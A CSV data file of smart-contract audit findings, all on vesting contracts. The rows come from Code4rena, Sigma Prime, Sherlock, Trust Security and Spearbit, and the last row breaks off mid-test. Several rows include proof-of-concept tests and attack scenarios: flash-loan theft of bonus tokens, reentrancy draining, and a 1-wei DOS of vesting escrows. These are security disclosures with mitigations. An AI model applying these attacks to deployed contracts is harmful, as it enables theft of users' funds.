id,key_no,title,audit_company,publish_date,content,protocol,finder_list,impact,tag_list,contest_prize_txt,pdf_page_from,general_score,quality_score,github_link,source_link,pdf_link,contest_link,spider_file,report_key_no,created_time,updated_time,is_valid,content_code,category_list
763420,26d663cc6891c8ddbbcaaf3b24d6c947,[H-02] StakedCitadel: wrong setupVesting function name,Code4rena,2022-04-14,"_Submitted by cccz, also found by TrungOre, wuwe1, reassor, 0xBug, georgypetrov, 0xDjango, scaraven, horsefacts, berndartmueller, CertoraInc, rayn, m9800, pedroais, and VAD37_

In the `\_withdraw` function of the StakedCitadel contract, the setupVesting function of vesting is called, while in the StakedCitadelVester contract, the function name is vest, which will cause the \_withdraw function to fail, so that the user cannot withdraw the tokens.

            IVesting(vesting).setupVesting(msg.sender, _amount, block.timestamp);
            token.safeTransfer(vesting, _amount);
            ...
        function vest(
            address recipient,
            uint256 _amount,
            uint256 _unlockBegin
        ) external {
            require(msg.sender == vault, ""StakedCitadelVester: only xCTDL vault"");
            require(_amount > 0, ""StakedCitadelVester: cannot vest 0"");

            vesting[recipient].lockedAmounts =
                vesting[recipient].lockedAmounts +
                _amount;
            vesting[recipient].unlockBegin = _unlockBegin;
            vesting[recipient].unlockEnd = _unlockBegin + vestingDuration;

            emit Vest(
                recipient,
                vesting[recipient].lockedAmounts,
                _unlockBegin,
                vesting[recipient].unlockEnd
            );
        }

### Proof of Concept

<https://github.com/code-423n4/2022-04-badger-citadel/blob/main/src/StakedCitadel.sol#L830>

<https://github.com/code-423n4/2022-04-badger-citadel/blob/main/src/interfaces/citadel/IVesting.sol#L5>

### Recommended Mitigation Steps

Use the correct function name

    interface IVesting {
        function vest(
            address recipient,
            uint256 _amount,
            uint256 _unlockBegin
        ) external;
    }
    ...
    IVesting(vesting).vest(msg.sender, _amount, block.timestamp);
    token.safeTransfer(vesting, _amount);

**[dapp-whisperer (BadgerDAO) confirmed and resolved](https://github.com/code-423n4/2022-04-badger-citadel-findings/issues/9)** 



***",BadgerDAO,scaraven|berndartmueller|georgypetrov|0xBug|m9800|cccz|0xDjango|pedroais|TrungOre|wuwe1|rayn|horsefacts|VAD37|reassor|CertoraInc,HIGH,,"$75,000 USDC",0,0,0,https://github.com/code-423n4/2022-04-badger-citadel-findings/issues/9,https://code4rena.com/reports/2022-04-badger-citadel,,https://code4rena.com/contests/2022-04-badger-citadel-contest,solodit_reports,4b6ea0d6d3da8bec2859e1674e0d44bb,2023-09-22 02:40:33,2024-10-14 22:18:50,1,"IVesting(vesting).setupVesting(msg.sender, _amount, block.timestamp);
```
    function setupVesting(",Liquid Staking|Dexes|Bridge|CDP|Yield
763614,db3e9dcf58ed53bd72890ebbeb8804d7,Reentrancy Vulnerabilities May Drain Tokens,SigmaPrime,2022-05-01,"Description
There is a potential reentrancy bug in FuroVesting.stopVesting() that allows draining the token balance of contract
for any ERC20 token that relinquishes control during transfer() . In addition to other ERC20 tokens, it’s also possible
to withdraw WETH as native ETH in BentoBox which will relinquish control to the attacker.
In the function stopVesting() ,_transferToken() is called twice before the state variable vests is updated on line
[156]. When toBentoBox = false , the underlying asset is transferred out of the BentoBox to recipient and owner
respectively.
If the token being transferred is one that relinquishes execution control during transfer() , an attacker could reenter
the stopVesting() function. Since delete vests[vestId]; has not yet been processed, both the calls to _transferToken()
would execute again.
Recommendations
To prevent reentrancy, apply the check-effects-interactions pattern. Specifically, delete vests[vestId] should occur
before making any external calls.
Another mitigation is to use reentrancy guards such as OpenZeppelin’s ReentrancyGuard over each of the functions
which makes external calls.
Resolution
The development team has fixed the issue by moving the line delete vests[vestId] to before the call to _transferToken() .
This is shown in PR 17.
Page | 12
Auction Maker and Furo Detailed Findings
SSAF-06 Incorrect Accounting When Updating Streams",Sushi,Sigma Prime,HIGH,,,13,0,0,,https://github.com/sigp/public-audits/blob/master/sushi/auction-maker-furo/review.pdf,https://solodit-bucket.s3.amazonaws.com/storage/reports/sigmaprime/auction-maker-furo.pdf,https://github.com/sigp/public-audits/blob/master/sushi/auction-maker-furo/review.pdf,solodit_reports,bf95e735a3d914f597bac7a975d96448,2023-09-22 02:40:45,2024-10-14 22:25:03,1,,Dexes|CDP|Yield|Services|Yield Aggregator
763636,01a7b7529062743bb4a8e26402c16ed7,Miscalculation of the Returnable Amount of Tokens,SigmaPrime,2022-05-01,"Description
An accounting error in stopVesting() leads to the overstatement of returnAmount , thereby transferring the owner
more shares than they are owed.
The returnAmount represents the amount of tokens in the vesting schedule that have not vested. This value is over-
stated as it includes the amount already claimed in addition to the amount left in the schedule. The following snippet
is from stopVesting() :
 uint256 canClaim =_balanceOf (vest ) - vest .claimed ;
uint256 returnAmount = (vest .cliffAmount +
 (vest .steps *vest .stepAmount )) - canClaim ;
Consider the edge case where the entire duration has passed and the recipient has claimed all of the tokens:
bal anceOf¹vestº=vest :cl ai med=vest :cl if f Amount ývest :st epsvest :st epAmount
From the code above we can calculate,
canCl ai m=bal anceOf¹vestº�vest :cl ai med=
r etur nAmount =vest :cl if f Amount ývest :st epsvest :st epAmount�canCl ai m
Since canCl ai m=we have,
r etur nAmount =vest :cl if f Amount ývest :st epsvest :st epAmount
The owner is therefore overpaid by the amount that has already been claimed, that is vest.claimed .
Recommendations
Consider updating returnAmount such that it does not include the vest.claimed value, as seen below:
uint256 amountVested =_balanceOf (vest );
uint256 canClaim =amountVested -vest .claimed ;
uint256 returnAmount = (vest .cliffAmount +
(vest .steps *vest .stepAmount )) - amountVested ;
Page | 10
Auction Maker and Furo Detailed Findings
Resolution
The development team has fixed the issue by implementing the recommended logic.
This is shown in PR 17.
Page | 11
Auction Maker and Furo Detailed Findings
SSAF-05 Reentrancy Vulnerabilities May Drain Tokens",Sushi,Sigma Prime,HIGH,,,11,0,0,,https://github.com/sigp/public-audits/blob/master/sushi/auction-maker-furo/review.pdf,https://solodit-bucket.s3.amazonaws.com/storage/reports/sigmaprime/auction-maker-furo.pdf,https://github.com/sigp/public-audits/blob/master/sushi/auction-maker-furo/review.pdf,solodit_reports,bf95e735a3d914f597bac7a975d96448,2023-09-22 02:40:46,2024-10-14 22:25:03,1,,Dexes|CDP|Yield|Services|Yield Aggregator
763637,58046558760b5f0b2d3b93dc99a21a5a,Token Amounts are Treated as Share Amounts,SigmaPrime,2022-05-01,"Description
Inconsistencies in accounting occur from treating certain variables in units of the underlying ERC20 tokens rather than
BentoBox shares , causing recipients to be overpaid.
In the function createVesting() on line [ 65],depositedShares is returned from _depositToken , but is not made use
of. Instead, the original token parameters of cliffAmount and stepAmount are stored in vests[vestId] .
The function _transferToken() expects amount to be a value in shares rather than underlying tokens. As a result,
withdraw() and stopVesting() will pay the recipient shares which are denominated in underlying token units.
As shares in BentoBox are worth more than the underlying token amounts, the recipient will be overpaid at the expense
of the protocol.
Recommendations
In the struct Vest , rename cliffAmount and stepAmount tocliffShares , and stepShares and within createVesting() ,
calculate the appropriate share values to use in these variables from depositedShares .
Resolution
The development team has fixed the issue by changing the input parameters to include a total token amount and a
percentage amount for the step size. The exact share values for cliff and steps are then calculated from these inputs
using depositedShares , the return value from _depositToken .
Where appropriate, variable names have also been changed to accurately reflect which variables are amounts and
which are shares.
This is shown in multiple commits and pull requests, with the latest being 5f88ce2.
Page | 9
Auction Maker and Furo Detailed Findings
SSAF-04 Miscalculation of the Returnable Amount of Tokens",Sushi,Sigma Prime,HIGH,,,10,0,0,,https://github.com/sigp/public-audits/blob/master/sushi/auction-maker-furo/review.pdf,https://solodit-bucket.s3.amazonaws.com/storage/reports/sigmaprime/auction-maker-furo.pdf,https://github.com/sigp/public-audits/blob/master/sushi/auction-maker-furo/review.pdf,solodit_reports,bf95e735a3d914f597bac7a975d96448,2023-09-22 02:40:46,2024-10-14 22:25:02,1,,Dexes|CDP|Yield|Services|Yield Aggregator
764017,8b7782c2420129f8f8e0327f2f11bc81,[H-03] Attacker could steal almost all the bonus tokens in BathBuddy Vesting Wallet,Code4rena,2022-05-23,"# Lines of code

https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/peripheral_contracts/BathBuddy.sol#L87


# Vulnerability details

## Background

BathBuddy is a Vesting Wallet that payout withdrawers any `bonusTokens` they may have accrued while staking in the Bath Token (e.g. network incentives/governance tokens).

BathBuddy Vesting Wallet releases a user their relative share of the pool’s total vested bonus token during the withdraw call on BathToken.sol. This vesting occurs linearly over Unix time.

It was observed that an attacker could steal almost all the `bonusTokens` in the BathBuddy Vesting Wallet.

## Proof-of-Concept

The root cause of this issue is that the amount of `bonusTokens` that a user is entitled to is based on their relative share of the pool’s total vested bonus token at the point of the withdraw call. It is calculated based on the user's ""spot"" share in the pool. Thus, it is possible for an attacker to deposit large amount of tokens into a BathToken Pool to gain significant share of the pool (e.g. 95%), and then withdraw the all the shares immediately. The withdraw call will trigger the `BathToken.distributeBonusTokenRewards`, and since attacker holds overwhelming amount of share in the pool, they will receive almost all the `bonusToken` in the BathBuddy Vesting wallet, leaving behind dust amount of `bonusToken` in the wallet. This could be perform in an atomic transaction and attacker can leverage on flash-loan to fund this attack.

The following shows an example of this issue:

1. A sponsor sent 1000 DAI to the BathBuddy Vesting Wallet to be used as `bonusTokens` for bathWETH pool. The vesting duration is 4 weeks.
2. Alice and Bob deposited 50 WETH and 50 WETH respectively. The total underlying asset of bathWETH is 100 WETH after depositing. Each of them hold 50% of the shares in the pool.
3. Fast forward to the last hour of the vesting period, most of the `bonusToken` have been vested and ready for the recipients to claim. In this example, estimate 998 DAI are ready to be claimed at the final hour.
4. Since Alice has 50% stake in the pool, she should have accured close to 449 DAI at this point. If she decided to withdraw all her bathWETH LP tokens at this point, she would receive close to 449 DAI as `bonusTokens`. But she choose not to withdraw yet.
5. Unfortunately, an attacker performed a flash-loan to borrow 8500 WETH, and deposit large amount of WETH into the bathWETH gain significant share of the pool, and then withdraw the all the shares immediately.
6. Since attacker hold the an overwhelming amount of shares in the pool, they will receive almost all the `bonusToken` (around 997 DAI) in the BathBuddy Vesting wallet, leaving behind dust amount of `bonusToken` in the wallet.
7. At this point, Alice decided to withdraw all her bathWETH LP token. She only received dust amount of 0.7 DAI as `bonusTokens`

The following code shows that the amount of `bonusTokens` a user is entitled is based on the user's current share in the pool - `amount = releasable * sharesWithdrawn/initialTotalSupply`.

[https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/peripheral_contracts/BathBuddy.sol#L87](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/peripheral_contracts/BathBuddy.sol#L87)

```solidity
/// @inheritdoc IBathBuddy
/// @dev Added and modified release function. Should be the only callable release function
function release(
    IERC20 token,
    address recipient,
    uint256 sharesWithdrawn,
    uint256 initialTotalSupply,
    uint256 poolFee
) external override {
    require(
        msg.sender == beneficiary,
        ""Caller is not the Bath Token beneficiary of these rewards""
    );
    uint256 releasable = vestedAmount(
        address(token),
        uint64(block.timestamp)
    ) - released(address(token));
    if (releasable > 0) {
        uint256 amount = releasable.mul(sharesWithdrawn).div(
            initialTotalSupply
        );
        uint256 _fee = amount.mul(poolFee).div(10000);

        ..SNIP..

        uint256 amountWithdrawn = amount.sub(_fee);
        token.transfer(recipient, amountWithdrawn);

        _erc20Released[address(token)] += amount;
        ..SNIP..
    }
}
```

## Test Scripts

Following is the test output that demostrate the above scenario:

```javascript
  Contract: Rubicon Exchange and Pools Original Tests
    Deployment
      ✓ is deployed (1783ms)
    Bath House Initialization of Bath Pair and Bath Tokens
      ✓ Bath House is deployed and initialized (66ms)
        new bathWETH! 0x237eda6f0102c1684caEbA3Ebd89e26a79258C6f
      ✓ WETH Bath Token for WETH asset is deployed and initialized (131ms)
      ✓ Init BathBuddy Vesting Wallet and Add BathBuddy to WETH BathToken Pool (54ms)
      ✓ Bath Pair is deployed and initialized w/ BathHouse (59ms)
        undefined
      ✓ Alice deposit 50 WETH to WETH bathTokens (137ms)
        undefined
      ✓ Bob deposit 50 WETH to WETH bathTokens (174ms)
bathAssetInstance.bonusTokens.length = 1
bathBuddyInstance (Vesting Wallet) has 1000 DAI
bathBuddyInstance.vestedAmount(DAI) = 0.000413359788359788
bathBuddyInstance.vestedAmount(DAI) = 500.000413359788359788 (End of 2nd week)
bathBuddyInstance.vestedAmount(DAI) = 998.512318121693121693 (Last hour of the vesting period)
0 DAI has been released from BathBuddy Vesting Wallet
Charles has 8500 bathWETH token, 0 DAI, 0 WETH
Charles withdraw all his bathWETH tokens
997.338978147402060445 DAI has been released from BathBuddy Vesting Wallet
Charles has 0 bathWETH token, 997.039776453957839827 DAI, 8497.45 WETH
Alice has 5 bathWETH token, 0 DAI, 0 WETH
998.075233164534207763 DAI has been released from BathBuddy Vesting Wallet
Alice has 0 bathWETH token, 0.736034140627007674 DAI, 6.2731175 WETH
      ✓ Add Rewards (100 DAI) to BathBuddy Vesting Wallet  (749ms)
bathAssetInstance: underlyingBalance() = 6.2768825 WETH, balanceOf = 6.2768825 WETH, Outstanding Amount = 0 WETH
      ✓ [Debug]
```

Attacker Charles deposited 8500 WETH to the pool and withdraw them immediately at the final hour, and obtained almost all of the `bonusTokens` (997 DAI). When Alice withdraw from the pool, she only received 0.7 DAI as `bonusTokens`.

Script can be found [https://gist.github.com/xiaoming9090/2252f6b6f7e62fca20ecfbaac6f754f5](https://gist.github.com/xiaoming9090/2252f6b6f7e62fca20ecfbaac6f754f5)

Note: Due to some unknown issue with the testing environment, please create a new `BathBuddy.released2` functions to fetch the amount of token already released.

## Impact

Loss of Fund for the users. BathToken LPs not able to receive the accured `bonusToken` that they are entitled to.

## Recommended Mitigation Steps

Update the reward mechanism to ensure that the `bonusTokens` are distribute fairly and rewards of each user are accured correctly.

In the above example, since Alice hold 50% of the shares in the pool throughout the majority of the reward period, she should be entitled to close to 50% to the rewards/bonus. Anyone who join the pool at the last hour of the reward period should only be entitled dust amount of `bonusToken`.

Additionally, ""spot"" (or current) share of the pool should not be used to determine the amount of `bonusToken` a user is entitled to as it is vulnerable to pool/share manipulation or flash-loan attack. Checkpointing mechanism should be implemented so that at the minimum, the user's amount of share in the previous block is used for determining the rewards. This make flash-loan attack infeasible as such attack has to happen within the same block/transaction.

For distributing bonus/rewards, I would suggest checking out a widely referenced [Synthetix's Reward](https://github.com/Synthetixio/synthetix/blob/develop/contracts/StakingRewards.sol) Contract as I think that it would be more relevant than OZ's Vesting Wallet for this particular purpose.",Rubicon,0x52|sashiketh_|shenwilly|xiaoming90|PP1004,HIGH,Vesting,"$50,000 USDC",0,4,5,https://github.com/code-423n4/2022-05-rubicon-findings/issues/109,https://code4rena.com/reports/2022-05-rubicon,,https://code4rena.com/contests/2022-05-rubicon-contest,solodit_reports,da842fda859da10b38b5d262c2ed8478,2023-09-22 02:41:08,2024-10-14 22:33:09,1,function release(,Dexes|CDP|Yield|Yield Aggregator|RWA
764022,f01f449b6612abaf84865827dd0f4890,[H-05] BathToken LPs Unable To Receive Bonus Token Due To Lack Of Wallet Setter Method,Code4rena,2022-05-23,"# Lines of code

https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/rubiconPools/BathToken.sol#L629


# Vulnerability details

## Background

BathBuddy is a Vesting Wallet that payout withdrawers any `bonusTokens` they may have accrued while staking in the Bath Token (e.g. network incentives/governance tokens).

BathBuddy Vesting Wallet releases a user their relative share of the pool’s total vested bonus token during the withdraw call on BathToken.sol. This vesting occurs linearly over Unix time.

It was observed that the BathToken LPs are unable to receive any bonus tokens from the BathBuddy Vesting Wallet during withdraw and the bonus tokens are struck in the BathBuddy Vesting Wallet.

## Proof-of-Concept

The following shows that the address of the BathBuddy Vesting Wallet is stored in the `rewardsVestingWallet` state variable and it is used to call the `release` function to distribute bonus to the BathToken withdrawers.

[https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/rubiconPools/BathToken.sol#L629](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/rubiconPools/BathToken.sol#L629)

```solidity
function distributeBonusTokenRewards(
    address receiver,
    uint256 sharesWithdrawn,
    uint256 initialTotalSupply
) internal {
    if (bonusTokens.length > 0) {
        for (uint256 index = 0; index < bonusTokens.length; index++) {
            IERC20 token = IERC20(bonusTokens[index]);
            // Note: Shares already burned in Bath Token _withdraw

            // Pair each bonus token with a lightly adapted OZ Vesting wallet. Each time a user withdraws, they
            //  are released their relative share of this pool, of vested BathBuddy rewards
            // The BathBuddy pool should accrue ERC-20 rewards just like OZ VestingWallet and simply just release the withdrawer's relative share of releaseable() tokens
            if (rewardsVestingWallet != IBathBuddy(0)) {
                rewardsVestingWallet.release(
                    (token),
                    receiver,
                    sharesWithdrawn,
                    initialTotalSupply,
                    feeBPS
                );
            }
        }
    }
}
```

However, there is no setter method to initialise the value of the `rewardsVestingWallet` state variable in the contracts. Therefore, the value of `rewardsVestingWallet` will always be zero. Note that Solidity only create a default getter for public state variable, but does not create a default setter.

Since `rewardsVestingWallet` is always zero, the condition `if (rewardsVestingWallet != IBathBuddy(0))` will always be evaluated as `false`. Thus, the code block `rewardsVestingWallet.release` will never be reached.

## Impact

Loss of Fund for the users. BathToken LPs are not able to receive their `bonusToken`.

## Recommended Mitigation Steps

Implement a setter method for the `rewardsVestingWallet` state variable in the contracts so that it can be initialised with BathBuddy Vesting Wallet address.",Rubicon,hubble|shenwilly_|pauliax|sseefried|0xNoah|xiaoming90|sashiketh|PP1004|reassor,HIGH,,"$50,000 USDC",0,0,0,https://github.com/code-423n4/2022-05-rubicon-findings/issues/107,https://code4rena.com/reports/2022-05-rubicon,,https://code4rena.com/contests/2022-05-rubicon-contest,solodit_reports,da842fda859da10b38b5d262c2ed8478,2023-09-22 02:41:08,2024-10-14 22:33:20,1,function distributeBonusTokenRewards(,Dexes|CDP|Yield|Yield Aggregator|RWA
765254,eebe5cc745990d426a1cd19809e31d93,[H-02] Permanent freeze of vested tokens due to overflow in _baseVestedAmount,Code4rena,2022-09-20,"# Lines of code

https://github.com/code-423n4/2022-09-vtvl/blob/f68b7f3e61dad0d873b5b5a1e8126b839afeab5f/contracts/VTVLVesting.sol#L176


# Vulnerability details

## Description 
The _baseVestedAmount() function calculates vested amount for some (claim, timestamp) pair. It is wrapped by several functions, like vestedAmount, which is used in withdraw() to calculate how much a user can retrieve from their claim. Therefore, it is critical that this function will calculate correctly for users to receive their funds.

Below is the calculation of the linear vest amount:
```
uint112 linearVestAmount = _claim.linearVestAmount * truncatedCurrentVestingDurationSecs / finalVestingDurationSecs;
```
Importantly, _claim.linearVestAmount is of type uint112 and truncatedCurrentVestingDurationSecs is of type uint40. Using compiler >= 0.8.0,  the product cannot exceed uint112 or else the function reverts due to overflow. In fact, we can show that uint112 is an inadequate size for this calculation.

The max value for uint112 is 5192296858534827628530496329220096. 
Seconds in year = 3600 * 24 * 365 = 31536000 
Tokens that inherit from ERC20 like the ones used in VTVL have 18 decimal places -> 1000000000000000000
This means the maximum number of tokens that are safe to vest for one year is 2**112 / 10e18 / (3600 * 24 * 365) = just 16,464,665 tokens. 
This is definitely not a very large amount and it is expected that some projects will mint a similar or larger amount for vesting for founders / early employees. For 4 year vesting, the safe amount drops to 4,116,166.
Projects that are not forewarned about this size limit are likely to suffer from freeze of funds of employees, which will require very patchy manual revocation and restructuring of the vesting to not overflow.

## Impact
Employees/founders do not have access to their vested tokens.

## Proof of Concept
Below is a test that demonstrates the overflow issue, 1 year after 17,000,000 tokens have matured.
```
describe('Long vest fail', async () => {
  let vestingContract: VestingContractType;
  // Default params
  // linearly Vest 10000, every 1s, between TS 1000 and 2000
  // additionally, cliff vests another 5000, at TS = 900
  const recipientAddress = await randomAddress();
  const startTimestamp = BigNumber.from(1000);
  const endTimestamp = BigNumber.from(1000 + 3600 * 24 * 365);
  const midTimestamp = BigNumber.from(1000 + (3600 * 24 * 365) / 2);
  const cliffReleaseTimestamp = BigNumber.from(0);
  const linearVestAmount = BigNumber.from('170000000000000000000000000');
  const cliffAmount = BigNumber.from(0);
  const releaseIntervalSecs = BigNumber.from(5);

  before(async () => {
    const {vestingContract: _vc} = await createPrefundedVestingContract({tokenName, tokenSymbol, initialSupplyTokens});
    vestingContract = _vc;
    await vestingContract.createClaim(recipientAddress, startTimestamp, endTimestamp, cliffReleaseTimestamp, releaseIntervalSecs, linearVestAmount, cliffAmount);
  });

  it('half term works', async() => {
    expect(await vestingContract.vestedAmount(recipientAddress, midTimestamp)).to.be.equal('85000000000000000000000000');
  });

  it('full term fails', async() => {
    // Note: at exactly the cliff time, linear vested amount won't yet come in play as we're only at second 0
    await expect(vestingContract.vestedAmount(recipientAddress, endTimestamp)).to.be.revertedWithPanic(0x11
    );
  });
});
```

## Tools Used
Manual audit, hardhat / chai.

## Recommended Mitigation Steps
Perform the intermediate calculation of linearVestAmount using the uint256 type.
```
uint112 linearVestAmount = uint112( uint256(_claim.linearVestAmount) * truncatedCurrentVestingDurationSecs / finalVestingDurationSecs);
```",VTVL,0xSky|hansfriese|bin2chen|neumo|wastewa|rokinot|Trust|KIntern_NA|CertoraInc|neko_nyaa,HIGH,,"$30,000 USDC",0,0,0,https://github.com/code-423n4/2022-09-vtvl-findings/issues/95,https://code4rena.com/reports/2022-09-vtvl,,https://code4rena.com/contests/2022-09-vtvl-contest,solodit_reports,d181d3f63faf6ddbdabbe9ac02cca383,2023-09-22 02:42:20,2024-10-14 23:02:32,1,,Dexes|CDP|Services|Cross Chain|Synthetics
766000,d3e23347fe42dcceea22b2f6114fa8f1,H-1: Fixed Term Teller tokens can be created with an expiry in the past,Sherlock,2022-11-16,"# Issue H-1: Fixed Term Teller tokens can be created with an expiry in the past 

Source: https://github.com/sherlock-audit/2022-11-bond-judging/issues/34 

## Found by 
obront

## Summary

The Fixed Term Teller does not allow tokens to be created with a timestamp in the past. This is a fact that protocols using this feature will expect to hold and build their systems around. However, users can submit expiry timestamps slightly in the future, which correlate to tokenIds in the past, which allows them to bypass this check.

## Vulnerability Detail

In `BondFixedTermTeller.sol`, the `create()` function allows protocols to trade their payout tokens directly for bond tokens. The expectation is that protocols will build their own mechanisms around this. It is explicitly required that they cannot do this for bond tokens that expire in the past, only those that have yet to expire:

```solidity
if (expiry_ < block.timestamp) revert Teller_InvalidParams();
```

However, because tokenIds round timestamps down to the latest day, protocols are able to get around this check.

Here's an example:
- The most recently expired token has an expiration time of 1668524400 (correlates to 9am this morning)
- It is currently 1668546000 (3pm this afternoon)
- A protocol calls create() with an expiry of 1668546000 + 1
- This passes the check that `expiry_ >= block.timestamp`
- When the expiry is passed to `getTokenId()` it rounds the time down to the latest day, which is the day corresponding with 9am this morning
- This expiry associated with this tokenId is 9am this morning, so they are able to redeem their tokens instantly

## Impact

Protocols can bypass the check that all created tokens must have an expiry in the future, and mint tokens with a past expiry that can be redeemed immediately. 

This may not cause a major problem for Bond Protocol itself, but protocols will be building on top of this feature without expecting this behavior. 

Let's consider, for example, a protocol that builds a mechanism where users can stake some asset, and the protocol will trade payout tokens to create bond tokens for them at a discount, with the assumption that they will expire in the future. This issue could create an opening for a savvy user to stake, mint bond tokens, redeem and dump them immediately, buy more assets to stake, and continue this cycle to earn arbitrage returns and tank the protocol's token.

Because there are a number of situations like the one above where this issue could lead to a major loss of funds for a protocol building on top of Bond, I consider this a high severity.

## Code Snippet

https://github.com/sherlock-audit/2022-11-bond/blob/main/src/BondFixedTermTeller.sol#L97-L105

## Tool used

Manual Review

## Recommendation

Before checking whether `expiry_ < block.timestamp`, expiry should be rounded to the nearest day:

```solidity
expiry = ((vesting_ + uint48(block.timestamp)) / uint48(1 days)) * uint48(1 days);
```

## Discussion

**Evert0x**

Message from sponsor

----

Agree with this finding. We implemented rounding of the expiry before checking whether it is in the past to both the Fixed Term and Fixed Expiry Tellers (fixed expiry added since we made a change to round these to the nearest day as well).


**xiaoming9090**

Fixed in https://github.com/Bond-Protocol/bonds/commit/54b6833a46b5ae4c3a3ca183b9a55ca8c1266827",Bond Protocol,obront,HIGH,Time Rounding|Bond,33333 USDC,0,5,4,https://github.com/sherlock-audit/2022-11-bond-judging/issues/34,,,https://app.sherlock.xyz/audits/contests/20,solodit_reports,,2023-09-22 02:43:04,2024-10-14 23:11:30,1,,Liquid Staking|Services|Cross Chain|Synthetics|RWA Lending
766507,dc8e7dd74dc3d5c74ebee3774790c81e,TRST-H-1 Linear vesting users may not receive vested amount,Trust Security,2022-12-14,"**Description:**
TokenTransmuter supports two types of transmutations, linear and instant. In linear, 
allocated amount is released across time until fully vested, while in instant the entire 
amount is released immediately. **transmuteLinear()** checks that there is enough output 
tokens left in the contract before accepting transfer of input tokens.
 ```solidity
        require(IERC20(outputTokenAddress).balanceOf(address(this)) >= 
            (totalAllocatedOutputToken - totalReleasedOutputToken), 
        ""INSUFFICIENT_OUTPUT_TOKEN"");
             IERC20(inputTokenAddress).transferFrom(msg.sender, address(0), 
        _inputTokenAmount);
 ```
However, `transmuteInstant()` lacks any remaining balance checks, and will operate as long 
as the function has enough output tokens to satisfy the request.

```solidity
        IERC20(inputTokenAddress).transferFrom(msg.sender, address(0), 
             _inputTokenAmount);
        SafeERC20.safeTransfer(IERC20(outputTokenAddress), msg.sender, 
             allocation);
        emit OutputTokenInstantReleased(msg.sender, allocation, 
             outputTokenAddress);
```
As a result, it is not ensured that tokens that have been reserved for linear distribution will 
be available when users request to claim them. An attacker may empty the output balance 
with a large instant transmute and steal future vested tokens of users.

**Recommended Mitigation:**
In transmuteInstant, add a check similar to the one in transmuteLinear. It will ensure 
allocations are kept faithfully.

**Team response:**
Issue was fixed.

**Mitigation review:**
The suggestion has been implemented. transmuteInstant checks that a sufficient balance is 
reserved for future linear vested tokens",Vagabond Token Transmuter,Trust Security,HIGH,,,0,0,0,,https://github.com/solodit/solodit_content/blob/main/reports/Trust Security/2022-12-14-Vagabond Token Transmuter.md,,,solodit_reports,,2023-09-22 02:43:34,2024-10-14 23:19:45,1,,
767043,14b8cfd9966a4a9f1860fa2fccc73d9d,A malicious user could DOS a vesting schedule by sending only 1 wei ofTLCto the vesting escrow,Spearbit,2023-01-24,"address
Severity: Critical Risk
Context:
• ERC20VestableVotesUpgradeable.1.sol#L132-L134
• ERC20VestableVotesUpgradeable.1.sol#L137-L139
• ERC20VestableVotesUpgradeable.1.sol#L86-L97
• ERC20VestableVotesUpgradeable.1.sol#L353
Description: An external user who owns some TLC tokens could DOS the vesting schedule of any user by sending
just1 wei of TLC to the escrow address related to the vesting schedule.
By doing that:
• The creator of the vesting schedule will not be able to revoke the vesting schedule.
• The beneficiary of the vesting schedule will not be able to release any vested tokens until the end of the
vesting schedule.
• Any external contracts or dApps will not be able to call computeVestingReleasableAmount .
In practice, all the functions that internally call _computeVestingReleasableAmount will revert because of an un-
derflow error when called before the vesting schedule ends.
The underflow error is thrown because, when called before the schedule ends, _computeVestingRe-
leasableAmount will enter the if (_time < _vestingSchedule.end) branch and will try to compute
uint256 releasedAmount = _computeVestedAmount(_vestingSchedule, _vestingSchedule.end) -
balanceOf(_escrow);
In this case, _computeVestedAmount(_vestingSchedule, _vestingSchedule.end) will always be lower than
balanceOf(_escrow) and the contract will revert with an underflow error.
When the vesting period ends, the contract will not enter the if (_time < _vestingSchedule.end) and the user
will be able to gain the whole vested amount plus the extra amount of TLC sent to the escrow account by the
malicious user.
Scenario:
1) Bob owns 1 TLC token.
2) Alluvial creates a vesting schedule for Alice like the following example:
createVestingSchedule(
VestingSchedule({
start: block.timestamp,
cliffDuration: 1 days,
lockDuration: 0,
duration: 10 days,
period: 1 days,
amount: 10,
beneficiary: alice,
delegatee: address(0),
revocable: true
})
);
3) Bob sends 1 TLC token to the vesting schedule escrow account of the Alice vesting schedule.
8
4) After the cliff period, Alice should be able to release 1 TLC token. Because now balanceOf(_escrow) is11
it will underflow as _computeVestedAmount(_vestingSchedule, _vestingSchedule.end) returns 10.
Find below a test case showing all three different DOS scenarios:
//SPDX-License-Identifier: MIT
pragma solidity 0.8.10;
import ""forge-std/Test.sol"";
import ""../src/TLC.1.sol"";
contract WrappedTLC is TLCV1 {
function deterministicVestingEscrow(uint256 _index) external view returns (address escrow) {
return _deterministicVestingEscrow(_index);
}
}
contract SpearVestTest is Test {
WrappedTLC internal tlc;
address internal escrowImplem;
address internal initAccount;
address internal bob;
address internal alice;
address internal carl;
function setUp() public {
initAccount = makeAddr(""init"");
bob = makeAddr(""bob"");
alice = makeAddr(""alice"");
carl = makeAddr(""carl"");
tlc = new WrappedTLC();
tlc.initTLCV1(initAccount);
}
function testDOSReleaseVestingSchedule() public {
// send Bob 1 vote token
vm.prank(initAccount);
tlc.transfer(bob, 1);
// create a vesting schedule for Alice
vm.prank(initAccount);
createVestingSchedule(
VestingSchedule({
start: block.timestamp,
cliffDuration: 1 days,
lockDuration: 0,
duration: 10 days,
period: 1 days,
amount: 10,
beneficiary: alice,
delegatee: address(0),
revocable: true
})
);
address aliceEscrow = tlc.deterministicVestingEscrow(0);
// Bob send one token directly to the Escrow contract of alice
9
vm.prank(bob);
tlc.transfer(aliceEscrow, 1);
// Cliff period has passed and Alice try to get the first batch of the vested token
vm.warp(block.timestamp + 1 days);
vm.prank(alice);
// The transaction will revert for UNDERFLOW because now the balance of the escrow has been
increased externally , !
vm.expectRevert(stdError.arithmeticError);
tlc.releaseVestingSchedule(0);
// Warp at the vesting schedule period end
vm.warp(block.timestamp + 9 days);
// Alice is able to get the whole vesting schedule amount
// plus the token sent by the attacker to the escrow contract
vm.prank(alice);
tlc.releaseVestingSchedule(0);
assertEq(tlc.balanceOf(alice), 11);
}
function testDOSRevokeVestingSchedule() public {
// send Bob 1 vote token
vm.prank(initAccount);
